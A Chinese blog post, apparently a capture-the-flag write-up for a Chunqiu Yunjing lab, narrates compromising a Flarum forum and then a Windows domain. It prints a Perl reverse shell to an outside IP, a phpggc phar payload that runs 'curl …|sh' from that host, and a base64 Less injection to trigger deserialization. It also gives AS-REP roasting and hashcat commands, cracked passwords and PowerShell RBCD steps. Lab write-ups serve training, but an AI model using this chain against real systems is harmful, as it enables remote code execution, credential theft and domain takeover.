@@ -1,0 +1,211 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <link rel="icon" href='https://static.dionysus.zip/static/favicon.ico' type="image/x-icon">
+    <title>Flarum - MoonlitSyntax</title>
+
+    <link rel="stylesheet" href='https://static.dionysus.zip/static/css/app-GERNH3ZV.css'>
+
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+</head>
+
+<body class="l-body">
+
+<nav class="c-nav">
+    <a href="/" class="c-nav__link">首页</a>
+    <a href="/archives" class="c-nav__link">归档</a>
+    <a href="/tags" class="c-nav__link">标签</a>
+    <a href="/categories" class="c-nav__link">分类</a>
+    <a href="/links" class="c-nav__link">友链</a>
+    <a href="/about" class="c-nav__link">关于</a>
+    <button id="search-button" class="c-nav__search-btn">
+        <i class="fas fa-search"></i>
+    </button>
+</nav>
+
+
+<div class="l-container">
+    <div class="l-nav-spacer"></div>
+    <main class="l-main">
+        
+<div class="c-post">
+    <aside class="c-post__toc">
+        <h2 class="c-post__toc-title">目录</h2>
+        
+        <div class="c-post__toc-empty">
+            <i class="fas fa-info-circle"></i> 本文暂无小节
+        </div>
+        
+    </aside>
+    <div class="c-post__main">
+        <header class="c-post__header">
+            <h1 class="c-post__title">Flarum</h1>
+            <div class="c-post__meta">
+                <span class="c-post__meta-create"><i class="fas fa-calendar-plus"></i> 创建：2024-01-11 17:49</span>
+                <span class="c-post__meta-updated"><i class="fas fa-calendar-check"></i> 更新：2024-09-11 10:47</span>
+                <span class="c-post__meta-category"><i class="fas fa-folder-open"></i> 分类：<a href="/categories/%e6%b8%97%e9%80%8f"><strong>渗透</strong></a></span>
+            </div>
+            <div class="c-post__tags">
+                <a href="/tags/%e6%98%a5%e7%a7%8b%e4%ba%91%e9%95%9c" class="c-post__tag">#春秋云镜</a>
+            </div>
+            <div class="c-post__description">
+                春秋云镜靶场
+            </div>
+        </header>
+
+        <article class="c-post__content prose"><p>一开始是个登录框</p>
+<p>账号给了<code>administrator</code>,爆破密码是<code>1chris</code></p>
+<p>p牛文章,编辑自定义样式里有less语法的css,所有可以执行命令</p>
+<p>1.txt</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">perl -e &#39;use Socket;$i=&#34;8.149.142.195&#34;;$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;
+</span></span></code></pre></div></div><p><code>~/phpggc-ser # php phpggc -p tar -b Monolog/RCE6 system &quot;curl 8.149.142.195:8888/1.txt|sh&quot;</code></p>
+<p>前面加上<code>@import (inline) 'data:text/css;base64,</code></p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">@import (inline) &#39;data:text/css;base64,dGVzdC50eHQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAwMDA2NDQAAAAAAAAAAAAAAAAAAAAAADAwMDAwMDAwMDA0ADE0NjEwNzM3NTQ2ADAwMDYyNzMgMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB1c3RhcgAwMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB0ZXN0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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ByP5xYKolH81KRvpAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=&#39;;
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">.test {
+</span></span><span class="line"><span class="cl">  content: data-uri(&#34;phar://./assets/forum.css&#34;);
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><p>然后触发反序列化</p>
+<p>less编译很久</p>
+<p>上马后 <code>getcap -r / 2&gt;/dev/null</code></p>
+<p>openssl提权拿flag <code>openssl enc -in &quot;/root/flag/flag01.txt&quot;</code></p>
+<p>内网扫描</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">172.22.60.8:139 open
+</span></span><span class="line"><span class="cl">172.22.60.42:135 open
+</span></span><span class="line"><span class="cl">172.22.60.15:135 open
+</span></span><span class="line"><span class="cl">172.22.60.8:135 open
+</span></span><span class="line"><span class="cl">172.22.60.52:80 open
+</span></span><span class="line"><span class="cl">172.22.60.52:22 open
+</span></span><span class="line"><span class="cl">172.22.60.42:445 open
+</span></span><span class="line"><span class="cl">172.22.60.15:445 open
+</span></span><span class="line"><span class="cl">172.22.60.8:445 open
+</span></span><span class="line"><span class="cl">172.22.60.42:139 open
+</span></span><span class="line"><span class="cl">172.22.60.15:139 open
+</span></span><span class="line"><span class="cl">172.22.60.8:88 open
+</span></span><span class="line"><span class="cl">[*] NetInfo:
+</span></span><span class="line"><span class="cl">[*]172.22.60.42
+</span></span><span class="line"><span class="cl">   [-&gt;]Fileserver
+</span></span><span class="line"><span class="cl">   [-&gt;]172.22.60.42
+</span></span><span class="line"><span class="cl">   [-&gt;]169.254.83.27
+</span></span><span class="line"><span class="cl">[*] NetInfo:
+</span></span><span class="line"><span class="cl">[*]172.22.60.8
+</span></span><span class="line"><span class="cl">   [-&gt;]DC
+</span></span><span class="line"><span class="cl">   [-&gt;]172.22.60.8
+</span></span><span class="line"><span class="cl">   [-&gt;]169.254.42.35
+</span></span><span class="line"><span class="cl">[*] NetBios: 172.22.60.8     [+]DC XIAORANG\DC              
+</span></span><span class="line"><span class="cl">[*] NetBios: 172.22.60.15    XIAORANG\PC1                   
+</span></span><span class="line"><span class="cl">[*] NetInfo:
+</span></span><span class="line"><span class="cl">[*]172.22.60.15
+</span></span><span class="line"><span class="cl">   [-&gt;]PC1
+</span></span><span class="line"><span class="cl">   [-&gt;]172.22.60.15
+</span></span><span class="line"><span class="cl">   [-&gt;]169.254.178.145
+</span></span><span class="line"><span class="cl">[*] NetBios: 172.22.60.42    XIAORANG\FILESERVER            
+</span></span><span class="line"><span class="cl">[*] WebTitle: http://172.22.60.52       code:200 len:5867   title:霄壤社区
+</span></span></code></pre></div></div><p>数据库里收集信息</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">    &#39;driver&#39; =&gt; &#39;mysql&#39;,
+</span></span><span class="line"><span class="cl">    &#39;host&#39; =&gt; &#39;localhost&#39;,
+</span></span><span class="line"><span class="cl">    &#39;port&#39; =&gt; 3306,
+</span></span><span class="line"><span class="cl">    &#39;database&#39; =&gt; &#39;flarum&#39;,
+</span></span><span class="line"><span class="cl">    &#39;username&#39; =&gt; &#39;root&#39;,
+</span></span><span class="line"><span class="cl">    &#39;password&#39; =&gt; &#39;Mysql@root123&#39;,
+</span></span></code></pre></div></div><p>导出用户名和email后打<code>AS-REP Roasting</code></p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">proxychains4 impacket-GetNPUsers -dc-ip 172.22.60.8 xiaorang.lab/ -usersfile flarum_users.txt
+</span></span></code></pre></div></div><p>得到hash</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">$krb5asrep$23$wangyun@XIAORANG.LAB:7113eff57f6a311ae31c6954239295c4$6d61457220f4a148bdb66b2eb60186c19fb59036b11408b4a16030a55f2e578917decac987e4bef1e5b758211a8a6657d7dcd7497a4f9f8d8574f19080146e794982c7dc0b9b86510cadc4c3ff84a7afef6fd51000c46cba3868799e5fe89a824acb90903b5e5a5da72503f30a8c9d016f298b2d3686bb75abfc48a7a2d31adc45600d6718c8b8b9712855c5f157c64f163e24fba17b0f926a62821344782e519d392da64129562cc04d0a098cdfb9d3c0101519c3b6c359467e061672ddde3853fa0101e1d6fa384cb4df313b6b6c4b0c8c8269f54dc9a4f04392ea6ad7c37084f0e3519e827a66f113f86b
+</span></span><span class="line"><span class="cl">$krb5asrep$23$zhangxin@XIAORANG.LAB:6a1df11dffef818977a03d01e7e34240$cc37025841b68c245336912104d4a4f0585c81685912feb5a08fe36e2c38e3ff550cc2902b8d7af2ad2846b4f6e9f785691b06d036c2941003af6eb13317da739a7fbd9779629345134d2d15b641684e477834e24eb9dc1fce6c912d9655813526175a3de0af09d778072cf2be2e7ef1d15e0b57850ebcb2e549d9e1638dde0f5f6809cd880635c759cf5074c238179b5377e5735b01be55b68f3f339eebe4382722d061b070ac328f912b2118efdafa99f81f5a7260ec253bafca4ebacae63e86627a20a2b80e5e1fd326a537d8c5d88a95273584549e47af14b54ee36a3c99244ef1405164903d963e4593
+</span></span></code></pre></div></div><p><code>hashcat -a 0 -m 18200 --force 1.txt /usr/share/wordlists/rockyou.txt</code></p>
+<p>直接爆破</p>
+<p><code>wangyun@XIAORANG.LAB::Adm12geC</code></p>
+<p>上去跑域内关系</p>
+<p>发现有GenericAll权限,FILESERVER机器有DCSync
+所以要通过这个对FILESERVER配置RBCD,然后DCSync拿域控</p>
+<p><code>fscan_amd64 -h 172.22.60.15 -p 1-65535</code>
+发现开了3389, rdp上去之后, xshell<code>https://github.com/JDArmy/SharpXDecrypt/</code>
+获取密码</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">UserName: zhangxin
+</span></span><span class="line"><span class="cl">Password: admin4qwY38cc
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="nc">Set</span><span class="o">-</span><span class="nc">ExecutionPolicy</span> <span class="nc">Bypass</span> <span class="o">-</span><span class="nc">Scope</span> <span class="nc">Process</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="o">-</span><span class="kn">module</span> <span class="p">.</span><span class="err">\</span><span class="nc">Powermad</span><span class="p">.</span><span class="nv">ps1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nc">New</span><span class="o">-</span><span class="nc">MachineAccount</span> <span class="o">-</span><span class="nc">MachineAccount</span> <span class="nv">test</span> <span class="o">-</span><span class="nc">Password</span> <span class="err">$</span><span class="p">(</span><span class="nc">ConvertTo</span><span class="o">-</span><span class="nc">SecureString</span> <span class="s2">&#34;123456&#34;</span> <span class="o">-</span><span class="nc">AsPlainText</span> <span class="o">-</span><span class="nc">Force</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="o">-</span><span class="kn">module</span> <span class="p">.</span><span class="err">\</span><span class="nv">powerview</span><span class="p">.</span><span class="nv">ps1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nc">Get</span><span class="o">-</span><span class="nc">NetComputer</span> <span class="nv">test</span> <span class="o">-</span><span class="nc">Properties</span> <span class="nv">objectsid</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//这里会得到sid,替代下条命令的sid
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">$</span><span class="nc">SD</span> <span class="o">=</span> <span class="nc">New</span><span class="o">-</span><span class="nc">Object</span> <span class="nc">Security</span><span class="p">.</span><span class="nc">AccessControl</span><span class="p">.</span><span class="nc">RawSecurityDescriptor</span> <span class="o">-</span><span class="nc">ArgumentList</span> <span class="s2">&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3535393121-624993632-895678587-1117)&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="nc">SDBytes</span> <span class="o">=</span> <span class="nc">New</span><span class="o">-</span><span class="nc">Object</span> <span class="nv">byte</span><span class="p">[]</span> <span class="p">(</span><span class="o">$</span><span class="nc">SD</span><span class="p">.</span><span class="nc">BinaryLength</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="nc">SD</span><span class="p">.</span><span class="nc">GetBinaryForm</span><span class="p">(</span><span class="o">$</span><span class="nc">SDBytes</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nc">Get</span><span class="o">-</span><span class="nc">DomainComputer</span> <span class="nc">Fileserver</span><span class="o">|</span> <span class="nc">Set</span><span class="o">-</span><span class="nc">DomainObject</span> <span class="o">-</span><span class="nc">Set</span> <span class="o">@</span><span class="p">{</span><span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span><span class="o">=$</span><span class="nc">SDBytes</span><span class="p">}</span> <span class="o">-</span><span class="nc">Verbose</span>
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><p>之后申请票据</p>
